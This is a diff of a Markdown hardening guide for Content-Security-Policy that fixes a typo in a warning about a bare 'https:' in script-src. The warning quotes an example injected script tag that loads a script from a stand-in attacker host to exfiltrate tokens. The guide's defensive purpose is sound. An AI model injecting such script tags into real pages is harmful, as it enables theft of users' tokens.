@@ -75,7 +75,7 @@ script-src 'self';
 
 > [!WARNING]
 > Removing `'unsafe-inline'` is only half the job: the bare `https:` in `script-src` trusts **every** HTTPS origin for scripts.
-> An attacker who can inject HTML can then load an external script from any host they control,for example `<script src="https://attacker.example/evil.js"></script>`, and the browser will fetch and execute it, allowing it to read and exfiltrate tokens.
+> An attacker who can inject HTML can then load an external script from any host they control, for example `<script src="https://attacker.example/evil.js"></script>`, and the browser will fetch and execute it, allowing it to read and exfiltrate tokens.
 > Drop the bare `https:` and list only the specific script origins you trust.
 
 Allow specific third-party scripts by adding their explicit origins (see [Common Third-Party Scenarios](#common-third-party-scenarios)) or a per-request nonce/hash — but never by re-adding `'unsafe-inline'` or a bare `https:`.
